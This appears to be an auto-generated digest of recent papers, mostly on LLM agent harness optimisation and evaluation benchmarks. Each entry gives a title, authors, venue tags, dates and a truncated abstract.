  - Research agents achieve increasingly strong benchmark scores, yet these scores do not necessarily translate into reliable delivery in ongoing research projects. Many research-agent benchmarks emphasize standalone tasks and relatively self-contained workflows in clean or curated w…

- **[AVCC: Audio-Visual Conversation Corpus for Turn-Taking Prediction with a Human Benchmark](https://arxiv.org/abs/2611.13957v1)**
  - *Haotian Qi, Gabriel Skantze*
  - `2026-11-10`
  - } Predicting who will speak next, and when, is a prerequisite for conversational agents and social robots that take turns without waiting for silence. Multiparty next-speaker prediction (NSP) has been studied on corpora with per-speaker sensors, each with its own event definition…

- **[EJAI: Judgment-Preserving Civic AI for Data Center Environmental Justice](https://arxiv.org/abs/2611.13525v2)**
  - *Evan Pačes-Wiles, Bryen Alvarez, Sara Gulabani et al.*
  - `2026-11-10`
  - Communities in the United States and around the world are contesting data centers, the physical infrastructure of AI. These disputes pose environmental justice issues: residents must weigh unevenly distributed burdens using evidence scattered across metrics, corporate claims, pol…

- **[Mobile AI Factory: Building Specialized Language Models for Your Mobile Device](https://arxiv.org/abs/2611.13509v1)**
  - *Evan Li, Krishna Deshpande, Wen Cheng et al.*
  - `2026-11-10`
  - Small language models (SLMs) running on mobile devices can keep user data private and work without connectivity. But they perform well only when fine-tuned for the target task and sized for the target device, a process that today requires repeated expert tuning. We present {\it M…

- **[BioMem: Agentic Memory for Biomedical LLM Agents](https://arxiv.org/abs/2611.13426v1)**
  - *Mingchen Li, Yongkang Xiao, Rumeng Li et al.*
  - `2026-11-10`
  - Large language models (LLMs) have demonstrated considerable potential in biomedical applications, while agentic memory systems have emerged as a promising approach to preserving and utilizing information across tasks and interactions. However, a fundamental question remains: how…

- **[PARLEY: Evaluating LLM Collaboration Through Cooperative Asymmetric Puzzles](https://arxiv.org/abs/2611.14242v1)**
  - *Javier Hernandez, Andrew D. Wilson*
  - `2026-11-10`
  - As large language models power autonomous agents, understanding how they collaborate and where they fail becomes critical. We introduce PARLEY, an extensible platform for studying LLM agent collaboration through four asymmetric puzzle tasks grounded in cognitive psychology (refer…

- **[Safety and Connectivity Certificates for Finite-Time Formation Transitions](https://arxiv.org/abs/2611.13927v1)**
  - *Yash Purswani, Shivansh Agarwal, Anuj Tiwari*
  - `2026-11-10`
  - Finite-time formation transitions are useful for coordinating multi-agent systems in time-critical missions, but convergence to a prescribed formation in finite time does not guarantee collision avoidance or communication connectivity during the transition. Existing approaches ad…


## Harness  (119)

### AAAI

- **[Style4D-Bench: A Benchmark Suite for 4D Stylization](https://arxiv.org/abs/2508.19243)**
  - *Bei-Qi Chen, S. Shao, Hai-Tang Feng et al.*
  - **AAAI 2025** · `2025-08-26`
  - We introduce Style4D-Bench, the first benchmark suite specifically designed for 4D stylization, with the goal of standardizing evaluation and facilitating progress in this emerging area. Style4D-Bench comprises: 1) a strong baseline that make an initial attempt for 4D stylization…


### ICML

- **[Harness Self-Evolution: Theory, Algorithms, Evaluation, Applications, and Impact](https://openreview.net/forum?id=m5jsFGXUM2)**
  - *Chuyang Wei, Haoxiang Guan, Minghang Zhu et al.*
  - **ICML 2025** · OpenReview · `2026-10-11`
  - Building agents that learn from experience is a central goal of artificial intelligence. Harness self-evolution offers a path toward this goal by adapting the system around a fixed base model. This article develops a unified framework for examining how execution feedback produces…

- **[DS-Lighting: Making Agent Harnesses Explicit for Data-Science Automation](https://openreview.net/forum?id=m7wsVqhIYs)**
  - **ICML 2025** · OpenReview · `2026-10-11`
  - Large Language Model (LLM) agents have shown promise for automating data-science workflows, yet their end-to-end performance depends critically on the agent harness that represents tasks, manages execution state, constrains output artifacts, and provides evaluation feedback. Exis…

- **[Can Harness Optimization Improve Agents? Generalizable Gains Versus Evaluation Noise](https://openreview.net/forum?id=Ri0rU3rPOS)**
  - **ICML 2025** · OpenReview · `2026-09-18`
  - Harness optimization methods revise an agent’s prompts, tools, memory, and run-
time control without updating model weights. We ask which of their improve-
ments can be distinguished from evaluation noise, and where the reliable ones
come from. We evaluate Meta-Harness, Agentic H…

- **[Harness-Zero: Harness Distillation via Agent-as-Harness](https://openreview.net/forum?id=rZ7eO7DZmc)**
  - **ICML 2025** · OpenReview · `2026-09-18`
  - Agent harnesses, the external systems that mediate model-environment interaction, can substantially improve agent performance, but their gains remain tied to the harness at deployment. Because the best harness varies across domains, instances, and models, a general-purpose agent…

- **[TAME: Transfer-Aware Model-Harness Co-Evolution through Learned Harness Revisions](https://openreview.net/forum?id=IXnpSW8g3v)**
  - **ICML 2025** · OpenReview · `2026-09-18`
  - Agentic post-training uses an execution harness both to help the model act and to produce the trajectories from which it learns. A harness that raises immediate success need not leave behind a model that performs well once that support changes. We measure this difference with cro…

- **[Hypothesis-Conditioned Evaluation for Efficient Harness Optimization](https://openreview.net/forum?id=q55gCb73ub)**
  - **ICML 2025** · OpenReview · `2026-09-18`
  - Harness optimization improves an LLM agent by editing its prompts, tools
and helper code with model weights fixed. Evaluating every edit on
every training task is expensive, but a small random sample can miss the
failure that motivated the edit. We introduce \emph{Hypothesis-Cond…

- **[Harness-Delta Attribution: Dissecting Gains From Harness Evolution](https://openreview.net/forum?id=PX4Zpvsaca)**
  - **ICML 2025** · OpenReview · `2026-09-18`
  - Harness evolution automatically optimizes the prompts, skills, tools, and orchestration code around a fixed-weight model, offering a way to improve agentic systems without updating model weights. The agent harness is iteratively optimized to achieve higher performance on the sear…

- **[Visual Reasoning at the Harness Level: A Ladder for Controlled Evaluation](https://openreview.net/forum?id=8Rdl9qkU1A)**
  - **ICML 2025** · OpenReview · `2026-09-18`
  - Advances in foundation models are shifting coding and working agents from predefined tools toward general computational environments. Yet existing visual agents often couple model, harness, and training choices, making it difficult to determine how this transition affects visual…

- **[AURA-Eval: Evaluation Framework for Acting Under Risk Awareness in LLM Agent Trajectories](https://openreview.net/forum?id=9XfH1iAA4W)**
  - **ICML 2025** · OpenReview · `2026-09-18`
  - LLM agents are increasingly taking actions with real consequences, yet safety evaluations often reduce their behavior to a final safe or unsafe outcome, obscuring whether the agent recognized the risk and how it responded. We introduce AURA-Eval, a framework for evaluating whethe…

- **[Rethinking the Evaluation of Harness Evolution for Agents](https://openreview.net/forum?id=QDdWiaNkk2)**
  - **ICML 2025** · OpenReview · `2026-09-17`
  - Harness evolution is an iterative search procedure that repeatedly evaluates and revises candidate harnesses used for LLM agents using task feedback. We revisit the evaluation of such automatic harness evolution procedures and identify two fundamental issues in the protocol. Firs…

- **[EvoVE: Evolving Video Evaluation Through A Self-Improving Harness](https://openreview.net/forum?id=adiE97Xeyr)**
  - *{'username': '~JING_NING2', 'fullname': 'JING NING', 'institutions': [{'name': 'ByteDance Inc.', 'domain': 'bytedance.com', 'country': 'US'}]}, {'username': '~Yan_Zhang12', 'fullname': 'Yan Zhang', 'institutions': [{'name': 'ByteDance Inc.', 'domain': 'bytedance.com', 'country': 'US'}]}, {'username': '~Sahil_Shah3', 'fullname': 'Sahil Shah', 'institutions': [{'name': 'University of Illinois at Urbana-Champaign', 'domain': 'illinois.edu', 'country': 'US'}]} et al.*
  - **ICML 2025** · OpenReview · `2026-09-17`
  - Modern video generation models are improving at a rapid rate, and they are quickly spreading into domains such as film production, advertising, education, and robotics simulation. Each new generation brings new capabilities and, with them, new failure modes: Seedance 2.5 accepts…

- **[Harness-MAP: Budget-Efficient Harness Search via Structure-Token Factorization](https://openreview.net/forum?id=HM48DQvAqS)**
  - **ICML 2025** · OpenReview · `2026-09-17`
  - Automating harness evolution via naive meta-agent search is prohibitively expensive, requiring hundreds of meta-agent calls and minutes-to-hours per evaluation.
How can we efficiently search for a diverse set of high-quality harnesses under a tight evaluation budget?
To address t…

- **[PACE-3D: A structure-aware multi-dimensional evaluation framework for codon optimization via AlphaFold2-derived metrics](https://openreview.net/forum?id=5ZPzR0D1Br)**
  - **ICML 2025** · OpenReview · `2026-09-16`
  - Codon optimization is the cornerstone of heterologous protein expression, but current metrics, such as the Codon Adaptation Index (CAI), only focus on translation elongation rates and ignore the complex coupling between translation dynamics and co-translational folding. Therefore…

- **[FinancialAuditBench: Benchmark Construction under Differential Privacy Using Real-World Priors](https://openreview.net/forum?id=RKKGxm7O4L)**
  - **ICML 2025** · OpenReview · `2026-09-16`
  - As AI agents are becoming widely adopted in the financial services industry, careful measurement is essential to understand where they can be reliably deployed and where oversight and professional review remain necessary. Such measurement, however, is constrained by limited acces…

- **[Turbo Harness: Instance-Adaptive Harness Optimization](https://openreview.net/forum?id=Iyc8G0eNib)**
  - **ICML 2025** · OpenReview · `2026-09-13`
  - Designing effective harnesses with minimal human intervention is an important challenge for building modern agents. Existing automated harness optimization methods typically produce a single global harness that is applied uniformly across future problem instances. However, a harn…

- **[FrontierSpatial: Holistic Evaluation of Spatial Reasoning in Large Multimodal Models](https://openreview.net/forum?id=Aoghe69Xw0)**
  - **ICML 2025** · OpenReview · `2026-09-04`
  - Spatial reasoning is foundational to intelligent systems, yet its evaluation in multi-modal large language models (MLLMs) remains fragmented across narrow benchmarks that test isolated skills. We introduce ***FrontierSpatial***, a unified bench-
mark and evaluation framework for…

- **[Answers Without the Model: Harness Failures and a Zero-Cost Noise Floor for Small-Scale LLM Evaluation](https://openreview.net/forum?id=MXxiEnXvTw)**
  - *{'username': '~Satoshi_Akiyama1', 'fullname': 'Satoshi Akiyama', 'institutions': [{'name': 'Independent', 'domain': 'independent-researcher.org', 'country': 'JP'}]}*
  - **ICML 2025** · OpenReview · `2026-09-02`
  - When an LLM evaluation harness is written by the same person who reads its output, its defects arrive disguised as findings. In one such programme (20 waves, 79,021 rows, one consumer GPU), three defects produced apparent findings: distractors reconstructed the answer, an answer…

- **[CHART: A Harness-Rotation Curriculum for Harness-Robust Search Agents](https://openreview.net/forum?id=HdwZqmT4Ld)**
  - *{'username': '~Xinlu_Zhang1', 'fullname': 'Xinlu Zhang', 'institutions': [{'name': 'Amazon', 'domain': 'amazon.com', 'country': 'US'}]}, {'username': '~Ying-Chun_Lin2', 'fullname': 'Ying-Chun Lin', 'institutions': [{'name': 'Amazon', 'domain': 'amazon.com', 'country': 'US'}]}, {'username': '~Zhihan_Zhang2', 'fullname': 'Zhihan Zhang', 'institutions': [{'name': 'Amazon', 'domain': 'amazon.com', 'country': 'US'}]} et al.*
  - **ICML 2025** · OpenReview · `2026-08-28`
  - Search agents are usually trained under a single harness. But once an agent is deployed in a real application, its harness is frequently updated (e.g., a rewritten system prompt) to fit production needs. This exposes a fragility of post-trained agents: because a learned behavior…

- **[AgenticRag-R1: Agentic Reinforcement Learning with Stack Memory for Multi-Step Reasoning, Retrieval and Memorizing](https://arxiv.org/abs/2608.29622)**
  - *{'fullname': 'Xinke Jiang', 'username': ''}, {'fullname': 'Yue Fang', 'username': ''}, {'fullname': 'Zhibang Yang', 'username': ''} et al.*
  - **ICML 2025** · OpenReview · `2026-08-01`
  - Retrieval-Augmented Generation (RAG) improves the factuality of large language models (LLMs), yet existing RAG systems often struggle with complex, multi-step reasoning that requires adaptive retrieval and continuous revision of intermediate contexts. Recent reinforcement learnin…

- **[Harness Engineering for LLM Agents: A Survey of Harness Component Taxonomy, Evaluation, and Model--Harness Coevolution](https://openreview.net/forum?id=1VJLY0hAFT)**
  - **ICML 2025** · OpenReview · `2026-07-03`
  - As large language model-driven autonomous agents are increasingly deployed in real-world long-horizon, open-environment tasks, foundation models expose systematic capability gaps in context retention, reliable tool invocation, persistent state management, and multi-step execution…

- **[The Scaffold Effect in Coding Agents: Harness Choice as a Hidden Variable in Coding-Agent Evaluation](https://openreview.net/forum?id=1sqKRqsaE9)**
  - *Naman Vats, Oleg Aleksandrovich Golev*
  - **ICML 2025** · OpenReview · `2026-06-10`
  - Public leaderboards for coding agents typically rank systems by model name and pass rate, while the surrounding harness—the scaffold that issues tools, manages context, and decides when to stop—is often under-specified. Model-to-model comparison is valid when the harness is fixed…

- **[Clustering-based Prompt Optimization for LLM Evaluation](https://openreview.net/forum?id=vLGZhWJW3i)**
  - *Jinyoung Kim, Sun Kim, Inho Kang*
  - **ICML 2025** · OpenReview · `2026-06-10`
  - LLM evaluators (``AI judges'') increasingly stand in for human raters in search-quality pipelines, but their agreement with humans is fragile to how the scoring rubric is worded. We study how to optimize that rubric under a fixed budget of expert labels and evaluation calls, comp…

- **[FairCoder: Probing LLM Bias in High-Stakes Decision Making via Coding Tasks](https://openreview.net/forum?id=n7Mk11IVX8)**
  - *Yongkang Du, Jen-tse Huang, Jieyu Zhao et al.*
  - **ICML 2025** · OpenReview · `2026-06-03`
  - Large language models (LLMs) are increasingly used in high-stakes decisions such as hiring and college admissions, making their social bias a critical concern. While LLMs are trained to refuse explicitly biased requests, bias can be leaked implicitly during LLM planning and reaso…

- **[Operational Reframing and Approval-Framed Delegation in Multi-Agent LLM Safety](https://openreview.net/forum?id=7UXZAFMvpZ)**
  - *Lifei Liu, Haoran Yu, Xiaochong Jiang et al.*
  - **ICML 2025** · OpenReview · `2026-05-26`
  - Safety evaluations of multi-agent LLM systems often compare a direct prompt against a planner-executor pipeline and report the difference as a single "pipeline effect." This aggregate hides
  several simultaneous changes: harmful intent may be recast as plausible operational work…

- **[MacCode Lab: A Reproducible Single-Machine Harness for Execution-Guided Code Agents, and When Repair Actually Helps](https://openreview.net/forum?id=nsQjG3V0Fi)**
  - *Mayank Sharma, Rohit Kumar Mourya*
  - **ICML 2025** · OpenReview · `2026-05-22`
  - Code-agent evaluation is increasingly repeated as models, prompts, and agent components change, rather than performed only once as a leaderboard exercise. Practitioners need evaluation that runs economically on local hardware and identifies which parts of an agent loop contribute…

- **[Toward Trustworthy LLM–GNN Fusion: A Fusion-Aware Evaluation and Reporting Framework](https://openreview.net/forum?id=urfkW0BNuO)**
  - *Zhifei Hu, Alexandra I. Cristea*
  - **ICML 2025** · OpenReview · `2026-05-02`
  - Hybrid LLM–GNN systems are often evaluated primarily through task accuracy, which can obscure whether improvements arise from genuine
cross-modal interaction or from a dominant single modality. We propose a fusion-aware evaluation framework that attributes gains relative to
unimo…

- **[Towards Direct Evaluation of Harness Optimizers via Priority Ranking](https://arxiv.org/abs/2605.22505)**
  - *{'fullname': 'Kai Tzu-iunn Ong', 'username': ''}, {'fullname': 'Minseok Kang', 'username': ''}, {'fullname': 'Dongwook Choi', 'username': ''} et al.*
  - **ICML 2025** · OpenReview · `2026-05-01`
  - Harness optimization enables automated agent creation by having an optimizer agent iteratively update the harness of target agents. Despite its success, current studies evaluate optimizers solely by observing target agents' performance gains. This indirect end-improvement evaluat…

- **[vla-eval: A Unified Evaluation Harness for Vision-Language-Action Models](https://openreview.net/forum?id=IpKQsHWaYS)**
  - *Suhwan Choi, Yunsung Lee, Yu Been Park et al.*
  - **ICML 2025** · OpenReview · `2026-04-13`
  - Vision-Language-Action (VLA) models are increasingly evaluated across multiple simulation benchmarks, yet adding each benchmark to an evaluation pipeline requires resolving incompatible dependencies, matching underspecified evaluation protocols, and reverse-engineering undocument…

- **[The Tool Illusion: Rethinking Tool Use in Web Agents](https://openreview.net/forum?id=gQwin40zgt)**
  - *Renze Lou, Baolin Peng, Wenlin Yao et al.*
  - **ICML 2025** · OpenReview · `2026-03-14`
  - As web agents rapidly evolve, an increasing body of work has moved beyond conventional atomic browser interactions and explored tool use as a higher-level action paradigm. Although prior studies have shown the promise of tools, their conclusions are often drawn from limited exper…

- **[Locomo-Plus: Beyond-Factual Cognitive Memory Evaluation Framework for LLM Agents](https://openreview.net/forum?id=QGJrLaES6h)**
  - *{'fullname': 'Yifei Li', 'username': ''}, {'fullname': 'Weidong Guo', 'username': ''}, {'fullname': 'Lingling Zhang', 'username': ''} et al.*
  - **ICML 2025** · OpenReview · `2026-01-01`
  - Long-term conversational memory is a core capability for LLM-baseddialogue systems, yet existing benchmarks and evaluation protocolsprimarily focus on surface-level factual recall.In realistic interactions, appropriate responses often depend onimplicit constraints such as user st…

- **[Conversational Agents: A Framework for Evaluation (CAFE) (Dagstuhl Perspectives Workshop 24352)](https://openreview.net/forum?id=rpLDo1d8oU)**
  - *{'fullname': 'Christine Bauer', 'username': '~Christine_Bauer1'}, {'fullname': 'Li Chen'}, {'fullname': 'Nicola Ferro'} et al.*
  - **ICML 2025** · OpenReview · `2025-12-19`
  - During the workshop, we deeply discussed what CONversational Information ACcess (CONIAC) is and its unique features, proposing a world model abstracting it, and defined the Conversational Agents Framework for Evaluation (CAFE) for the evaluation of CONIAC systems, consisting of s…

- **[Evaluate on lm-evaluation-harness](https://openreview.net/forum?id=DBgYQiFOjb)**
  - **ICML 2025** · OpenReview · `2025-11-29`

- **[Benchmark Profiling: Mechanistic Diagnosis of LLM Benchmarks](https://arxiv.org/abs/2510.01232)**
  - *Dongjun Kim, Gyuho Shim, Yongchan Chun et al.*
  - **ICML 2025** · OpenReview · `2025-10-01`
  - Large Language Models are commonly judged by their scores on standard benchmarks, yet such scores often overstate real capability since they mask the mix of skills a task actually demands. For example, ARC is assumed to test reasoning, while HellaSwag is designed to evaluate comm…

- **[FinTSBridge: A New Evaluation Suite for Real-world Financial Prediction with Advanced Time Series Models](https://openreview.net/forum?id=b3xZoZcW1J)**
  - *Yanlong Wang, Jian Xu, Tiantian Gao et al.*
  - **ICML 2025** · OpenReview · `2025-09-25`
  - Despite the growing attention to time series forecasting in recent years, many studies have proposed various solutions to address the challenges encountered in time series prediction, aiming to improve forecasting performance. However, the strategic interactions inherent in finan…

- **[AU-Harness: An Open-Source Toolkit for Holistic Evaluation of AudioLLMs](https://openreview.net/forum?id=3eoCXVxvbZ)**
  - *Hoang H Nguyen, Sidharth Surapaneni, Akshay Kalkunte Suresh et al.*
  - **ICML 2025** · OpenReview · `2025-09-17`
  - Large Audio Language Models (LALMs) are rapidly advancing, but evaluating them remains challenging due to inefficient toolkits that limit fair comparison and systematic assessment. Current frameworks suffer from three critical issues: slow processing that bottlenecks large-scale…

- **[CTBench: Cryptocurrency Time Series Generation Benchmark](https://openreview.net/forum?id=RzT2sombPD)**
  - *Yihao Ang, Qiang Wang, Qiang Huang et al.*
  - **ICML 2025** · OpenReview · `2025-09-17`
  - Synthetic time series are vital for data augmentation, stress testing, and prototyping in quantitative finance. Yet in cryptocurrency markets, characterized by 24/7 trading, extreme volatility, and rapid regime shifts, existing Time Series Generation (TSG) methods and benchmarks…

- **[Formal Methods-based Evaluation of LLM Systematic Generalization](https://openreview.net/forum?id=gIvtkwqyub)**
  - *Gao Tianxi, Cai Yufan, Zhe Hou et al.*
  - **ICML 2025** · OpenReview · `2025-09-15`
  - Recent advances in large language models(LLMs) have demonstrated impressive performance on a wide range of mathematic benchmarks.
Yet a critical challenge remains: systematic generalization, which is the ability to correctly reason about novel combinations and unseen contexts.
We…

- **[Prompt Genotyping: Quantifying the Evaluation Gap Between Synthetic Benchmarks and Real LLM Performance](https://openreview.net/forum?id=WCNAcIKREG)**
  - *Sohum Mehta, Saaketh Bhojanam*
  - **ICML 2025** · OpenReview · `2025-09-05`
  - LLM evaluation relies heavily on synthetic benchmarks, but how well do these predict real-world performance? We introduce Prompt Genotyping, a framework treating prompts as measurable ''genomes'' of 14 linguistic features to predict LLM ''phenotypes'' (performance outcomes). Usin…

- **[The Social Laboratory: A Psychometric Framework for Multi-Agent LLM Evaluation](https://openreview.net/forum?id=5Larp1U1Mq)**
  - *Zarreen Reza*
  - **ICML 2025** · OpenReview · `2025-09-05`
  - As Large Language Models (LLMs) transition from static tools to autonomous agents, traditional evaluation benchmarks that measure performance on downstream tasks are becoming insufficient. These methods fail to capture the emergent social and cognitive dynamics that arise when ag…

- **[RADAR: Mechanistic Pathways for Detecting Data Contamination in LLM Evaluation](https://openreview.net/forum?id=d0di5jC9kb)**
  - *Ashish Kattamuri, Harshwardhan Fartale, Arpita Vats et al.*
  - **ICML 2025** · OpenReview · `2025-09-05`
  - Data contamination poses a significant challenge to reliable LLM evaluation, where models may achieve high performance by memorizing training data rather than demonstrating genuine reasoning capabilities. We introduce RADAR (Recall vs. Reasoning Detection through Activation Repre…

- **[Improving Automated LLM Evaluation by Introducing Personas in LLM Red-Teaming](https://openreview.net/forum?id=Q3zYGHp2hl)**
  - *Wesley Deng, Sunnie S. Y. Kim, Akshita Jha et al.*
  - **ICML 2025** · OpenReview · `2025-09-04`
  - Recent developments in AI safety and Responsible AI research have called for red-teaming methods that can effectively surface potential risks posed by LLMs. Many of these calls have emphasized how the identities and backgrounds of red-teamers can shape their red-teaming strategie…

- **[When Benchmarks Age: Temporal Misalignment through Large Language Model Factuality Evaluation](https://openreview.net/forum?id=WRMjVoJfCY)**
  - *Xunyi Jiang, Dingyi Chang, Xin Xu*
  - **ICML 2025** · OpenReview · `2025-09-04`
  - The rapid evolution of large language models (LLMs) and the real world has outpaced the static nature of widely used evaluation benchmarks, raising concerns about their reliability for evaluating LLM factuality. While substantial works continue to rely on the popular but old benc…

- **[Rethinking MCQ Benchmarks: Mandatory Reasoning Evaluation Reveals Significant Performance Drops in Large Language Models](https://openreview.net/forum?id=U0WNteGf73)**
  - *Yue Zhang, Nhan Nguyen*
  - **ICML 2025** · OpenReview · `2025-09-04`
  - Rigorous evaluation of Large Language Models (LLMs) is critical for their adoption in high-stakes applications, particularly in highly technical domains that require deep expertise and specialized training. The proliferation of LLMs from various providers further underscores the…

- **[Human-Centric Framework for Large Multimodal Models Evaluation](https://openreview.net/forum?id=Xx9t6pe1Pk)**
  - *Shaina Raza, Aravind Narayanan, Vahid Reza Khazaie et al.*
  - **ICML 2025** · OpenReview · `2025-09-04`
  - Large multimodal models (LMMs) have been widely tested on tasks like visual question answering (VQA), image captioning, and grounding, but lack rigorous evaluation for alignment with human-centered (HC) values such as fairness, ethics, and inclusivity. To address this gap, we int…

- **[Toward Community-Driven Agents for Machine Learning Engineering](https://openreview.net/forum?id=aKChEjaJpZ)**
  - *Sijie Li, Weiwei Sun, Shanda Li et al.*
  - **ICML 2025** · OpenReview · `2025-09-03`
  - Large language model-based machine learning (ML) agents have shown great promise in automating ML research.
However, existing agents typically operate in isolation on a given research problem, without engaging with the broader research community, where human researchers often gai…

- **[Who Routes the Router: Rethinking the Evaluation of LLM Routing Systems](https://openreview.net/forum?id=EEPostHMtF)**
  - *Jiayi Yuan, Yifan Lu, Rixin Liu et al.*
  - **ICML 2025** · OpenReview · `2025-09-03`
  - The growing ecosystem of Large Language Models (LLMs) with diverse capabilities and costs has motivated the need for LLM routing systems that dynamically select the most appropriate model for each query.
Evaluating these routing systems is important yet inherently challenging due…

- **[Data Centric Guard (DC-Guard) - A Framework for Trustworthy LLM Evaluation](https://openreview.net/forum?id=4mqbmnWYAm)**
  - *Vishnu Vardhan Yadoji*
  - **ICML 2025** · OpenReview · `2025-09-03`
  - In the current era, Large Language Models (LLMs) continue to achieve remarkable results yet their evaluation is increasingly undermined by data-centric challenges such as contamination, memorization and benchmark bias which threaten the reliability of reported performance. To add…

- **[Multi-Agent-as-Judge: Aligning LLM-Agent-Based Automated Evaluation with Multi-Dimensional Human Evaluation](https://openreview.net/forum?id=7AetgL7eVL)**
  - *Jiaju Chen, Yuxuan Lu, Xiaojie Wang et al.*
  - **ICML 2025** · OpenReview · `2025-08-31`
  - Nearly all human work is collaborative; thus, the evaluation of real-world NLP applications often requires multiple dimensions that align with diverse human perspectives. As real human evaluator resources are often scarce and costly, the emerging “LLM-as-a-judge” paradigm sheds l…

- **[From Many Voices to One: Statistically Principled Aggregation of LLM Judges](https://openreview.net/forum?id=XdcofpTCyq)**
  - *Jitian Zhao, Changho Shin, Tzu-Heng Huang et al.*
  - **ICML 2025** · OpenReview · `2025-08-29`
  - LLM-as-a-judge---often with multiple judges---is now the standard for scalable model evaluation, yet judge biases and correlations can amplify errors. We cast aggregation as inference in a latent-factor Markov random field that jointly models a latent true-quality variable, inter…

- **[RAFFLES: Reasoning-based Attribution of Faults for LLM Systems](https://openreview.net/forum?id=0oxelK4W6c)**
  - *Chenyang Zhu, Spencer Hong, Jingyu Wu et al.*
  - **ICML 2025** · OpenReview · `2025-08-29`
  - We have reached a critical roadblock in the development and enhancement of long-horizon, multi-component LLM agentic systems: it is incredibly tricky to identify where these systems breakdown and why. Evaluation capabilities that currently exist today (e.g., single pass LLM-as-a-…

- **[H-DDx: A Hierarchical Evaluation Framework for Differential Diagnosis](https://openreview.net/forum?id=gTq3VkpBvN)**
  - *Seungseop Lim, Gibaeg Kim, Hyunkyung Lee et al.*
  - **ICML 2025** · OpenReview · `2025-08-29`
  - An accurate differential diagnosis (DDx) is essential for patient care, shaping therapeutic decisions and influencing outcomes. Recently, Large Language Models (LLMs) have emerged as promising tools to support this process by generating a DDx list from patient narratives. However…

- **[MermaidSeqBench: An Evaluation Benchmark for LLM-to-Mermaid Sequence Diagram Generation](https://openreview.net/forum?id=cGXircO5gy)**
  - *Basel Shbita, Farhan Ahmed, Chad DeLuca*
  - **ICML 2025** · OpenReview · `2025-08-25`
  - Large language models (LLMs) have demonstrated excellent capabilities in generating structured diagrams from natural language descriptions. In particular, they have shown great promise in generating sequence diagrams for software engineering, typically represented in a text-based…

- **[Conversational Agents: A Framework for Evaluation (CAFE)](https://openreview.net/forum?id=s4QQ6uxQcx)**
  - *{'fullname': 'Christine Bauer', 'username': '~Christine_Bauer1'}, {'fullname': 'Li Chen'}, {'fullname': 'Nicola Ferro'} et al.*
  - **ICML 2025** · OpenReview · `2025-03-19`
  - This report documents the program and the outcomes of the Dagstuhl Perspectives Workshop 24352, "Conversational Agents: A Framework for Evaluation (CAFE)", which brought together 22 distinguished researchers and practitioners from 12 countries. In this workshop, a new framework f…

- **[Review to Copilot Evaluation Harness](https://openreview.net/forum?id=AXPuV3mrnL)**
  - **ICML 2025** · OpenReview · `2025-03-01`

- **[Benchmark Profiling: Mechanistic Diagnosis of LLM Benchmarks](https://openreview.net/forum?id=y4asE42Dmi)**
  - *{'fullname': 'Dongjun Kim', 'username': ''}, {'fullname': 'Gyuho Shim', 'username': '~Gyuho_Shim1'}, {'fullname': 'Yongchan Chun', 'username': '~Yongchan_Chun1'} et al.*
  - **ICML 2025** · OpenReview · `2025-01-01`
  - Large Language Models are commonly judged by their scores on standard benchmarks, yet such scores often overstate real capability since they mask the mix of skills a task actually demands. For example, ARC is assumed to test reasoning, while HellaSwag is designed to evaluate comm…

- **[Evaluation framework for copyright takedowns](https://openreview.net/forum?id=Esv8SwwkjG)**
  - **ICML 2025** · OpenReview · `2024-07-25`

- **[eva: Evaluation framework for pathology foundation models](https://openreview.net/forum?id=FNBQOPj18N)**
  - *kaiko.ai, Ioannis Gatopoulos, Nicolas Känzig et al.*
  - **ICML 2025** · OpenReview · `2024-04-05`
  - In computational pathology, self-supervised learning trained models surpass supervised ones in scale and performance. However, the benchmarking of these models remains a challenge due to the diversity in tasks and evaluation methods. To address this, we introduce eva (available a…

- **[ChEF: A Comprehensive Evaluation Framework for Standardized Assessment of Multimodal Large Language Models](https://openreview.net/forum?id=ClqyY6Bvb7)**
  - *Zhelun Shi, Zhipin Wang, Hongxing Fan et al.*
  - **ICML 2025** · OpenReview · `2023-09-15`
  - Multimodal Large Language Models (MLLMs) have shown impressive abilities in interacting with visual content with myriad potential downstream tasks. However, even though a list of benchmarks has been proposed, the capabilities and limitations of MLLMs are still not comprehensively…

- **[PEAS: A Performance Evaluation Framework for Auto-Scaling Strategies in Cloud Applications](https://openreview.net/forum?id=mmjxzINQgA)**
  - *Alessandro Vittorio Papadopoulos, Ahmed Ali-Eldin, Karl-Erik Årzén et al.*
  - **ICML 2025** · OpenReview · `2016-01-01`
  - Numerous auto-scaling strategies have been proposed in the past few years for improving various Quality of Service (QoS) indicators of cloud applications, for example, response time and throughput, by adapting the amount of resources assigned to the application to meet the worklo…


### ICLR

- **[IVEBench: Modern Benchmark Suite for Instruction-Guided Video Editing Assessment](https://arxiv.org/abs/2510.11647)**
  - *Yi-Nan Chen, Jiang-Ning Zhang, Teng Hu et al.*
  - **ICLR 2025** · `2025-10-13`
  - Instruction-guided video editing has emerged as a rapidly advancing research direction, offering new opportunities for intuitive content transformation while also posing significant challenges for systematic evaluation. Existing video editing benchmarks fail to support the evalua…

- **[MME-Emotion: A Holistic Evaluation Benchmark for Emotional Intelligence in Multimodal Large Language Models](https://arxiv.org/abs/2508.09210)**
  - *Fan Zhang, Ze-Bang Cheng, Chong Deng et al.*
  - **ICLR 2025** · `2025-08-11`
  - Recent advances in multimodal large language models (MLLMs) have catalyzed transformative progress in affective computing, enabling models to exhibit emergent emotional intelligence. Despite substantial methodological progress, current emotional benchmarks remain limited, as it i…

- **[AnesSuite: A Comprehensive Benchmark and Dataset Suite for Anesthesiology Reasoning in LLMs](https://arxiv.org/abs/2504.02404)**
  - *Xiang Feng, Wen-Tao Jiang, Zeng-Mao Wang et al.*
  - **ICLR 2025** · `2025-04-03`
  - The application of large language models (LLMs) in the medical field has garnered significant attention, yet their reasoning capabilities in more specialized domains like anesthesiology remain underexplored. To bridge this gap, we introduce AnesSuite, the first comprehensive data…

- **[SocialJax: An Evaluation Suite for Multi-agent Reinforcement Learning in Sequential Social Dilemmas](https://arxiv.org/abs/2503.14576)**
  - *Zi-Hao Guo, Shu-Qing Shi, Richard Willis et al.*
  - **ICLR 2025** · `2025-03-18`
  - Sequential social dilemmas pose a significant challenge in the field of multi-agent reinforcement learning (MARL), requiring environments that accurately reflect the tension between individual and collective interests. Previous benchmarks and environments, such as Melting Pot, pr…


### CVPR

- **[I2I-Bench: A Comprehensive Benchmark Suite for Image-to-Image Editing Models](https://arxiv.org/abs/2512.04660)**
  - *Jun-Tong Wang, Jia-Rui Wang, Hui-Yu Duan et al.*
  - **CVPR 2025** · `2025-12-04`
  - Image editing models are advancing rapidly, yet comprehensive evaluation remains a significant challenge. Existing image editing benchmarks generally suffer from limited task scopes, insufficient evaluation dimensions, and heavy reliance on manual annotations, which significantly…

